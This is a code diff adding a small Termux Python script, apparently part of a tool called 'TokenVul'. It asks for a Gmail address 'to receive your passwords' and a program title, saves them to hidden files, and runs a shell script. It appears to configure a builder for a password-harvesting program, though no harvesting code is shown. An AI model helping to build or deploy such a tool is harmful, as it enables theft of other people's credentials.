@@ -1,0 +1,13 @@
+gmail = input("Introduse tu gmail para recibir tus contraseñas: ")
+f = open("/data/data/com.termux/files/home/MgToLs/TokenVul/.tk/.gmail1.txt", "w")
+f.write(gmail)
+f.close()
+print ("")
+banner = input("Introduse un titulo para tu programa: ")
+f = open("/data/data/com.termux/files/home/MgToLs/TokenVul/.tk/.banner", "w")
+f.write(banner)
+f.close()
+print ("")
+import os
+resultado = os.system("sh .editor3")
+
